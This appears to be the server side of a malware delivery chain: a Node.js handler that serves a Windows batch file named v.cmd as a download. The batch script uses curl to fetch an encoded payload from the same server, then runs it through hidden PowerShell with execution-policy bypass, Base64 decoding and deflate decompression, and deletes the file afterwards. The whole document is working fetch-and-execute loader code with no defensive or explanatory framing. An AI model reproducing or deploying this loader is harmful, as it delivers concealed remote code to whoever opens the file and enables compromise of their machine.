function rnd(n) {
  const A = 'abcdefghijklmnopqrstuvwxyz';
  let s = '';
  for (let i = 0; i < n; i++) s += A[Math.floor(Math.random() * A.length)];
  return s;
}

module.exports = (req, res) => {
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const base = proto + '://' + req.headers.host;
  const fn = rnd(7) + '.txt';

  const ps = "$t=[IO.File]::ReadAllText($env:TEMP+'\\" + fn + "');"
    + "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String($t));"
    + "$d=New-Object IO.Compression.DeflateStream($s,[IO.Compression.CompressionMode]::Decompress);"
    + "$o=New-Object IO.MemoryStream;$d.CopyTo($o);"
    + "&([scriptblock]::Create([Text.Encoding]::UTF8.GetString($o.ToArray())))";

  const lines = [
    '@echo off',
    'setlocal',
    'cd /d "%TEMP%"',
    'curl.exe -s -o ' + fn + ' "' + base + '/a?_=' + Date.now() + '"',
    'if not exist ' + fn + ' exit /b 1',
    'powershell -nop -w h -ep bypass -c "' + ps + '"',
    'del ' + fn + ' >nul 2>&1',
    'exit'
  ];

  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', 'attachment; filename="v.cmd"');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  res.status(200).send(lines.join('\r\n') + '\r\n');
};
